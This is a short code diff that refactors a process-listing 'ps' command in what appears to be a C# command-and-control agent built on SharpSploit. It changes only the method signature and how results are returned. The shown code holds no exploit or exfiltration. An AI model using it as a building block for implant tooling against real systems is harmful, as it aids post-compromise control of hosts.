@@ -13,7 +13,7 @@ namespace Agent.Commands
     public class ListProcessCommand : AgentCommand
     {
         public override string Name => "ps";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
 
 
@@ -45,7 +45,7 @@ namespace Agent.Commands
 
             var results = new SharpSploitResultList<ListProcessResult>();
             results.AddRange(list.OrderBy(f => f.Name).ThenBy(f => f.Name));
-            result.Result = results.ToString();
+            context.Result.Result = results.ToString();
         }
 
         private string GetProcessPath(Process proc)
